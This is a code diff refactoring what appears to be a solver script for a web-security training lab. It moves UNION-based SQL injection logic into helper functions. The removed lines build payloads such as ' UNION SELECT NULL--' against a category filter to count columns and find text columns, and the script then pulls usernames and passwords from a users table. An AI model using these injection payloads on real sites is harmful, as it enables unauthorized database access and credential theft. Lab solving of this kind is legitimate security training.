@@ -2,8 +2,10 @@ from lib import (
     SESSION,
     LOGIN_CSRF_XPATH,
     generate_parser,
-    check_is_lab_solved,
     get_csrf_token,
+    find_no_of_columns,
+    find_columns_of_type_string,
+    check_is_lab_solved,
 )
 from lxml import html
 
@@ -12,41 +14,11 @@ if __name__ == "__main__":
 
     lab_url = args.lab_url.strip("/")
 
-    print("[+] Determining the number of columns using UNION SELECT...")
+    columns = find_no_of_columns(f"{lab_url}/filter?category=")
 
-    columns = 1
-
-    while True:
-        payload = ", ".join(["NULL"] * columns)
-        query = f"' UNION SELECT {payload}--"
-
-        print(f"[+] Making Query {columns}: {lab_url}/filter?category={query}")
-
-        if SESSION.get(f"{lab_url}/filter?category={query}").status_code == 200:
-            break
-        else:
-            columns += 1
-
-    print(f"[+] The number of columns found using UNION SELECT is {columns}")
-
-    print("[+] Finding columns containing text...")
-
-    target_columns = []
-
-    for i in range(columns):
-        payload = ", ".join(["'string'" if i == j else "NULL" for j in range(columns)])
-
-        query = f"' UNION SELECT {payload}--"
-
-        print(f"[+] Making Query {i}: {lab_url}/filter?category={query}")
-
-        if SESSION.get(f"{lab_url}/filter?category={query}").status_code == 200:
-            target_columns.append(i)
-        else:
-            continue
-
-    print(
-        f"[+] The columns containing text are: {', '.join(list(map(str, target_columns)))} (Index starts from 0!)"
+    target_columns = find_columns_of_type_string(
+        lab_url_with_end_point=f"{lab_url}/filter?category=",
+        no_of_columns=columns,
     )
 
     print("[+] Fetching the `username` and `password` columns from `users` table")
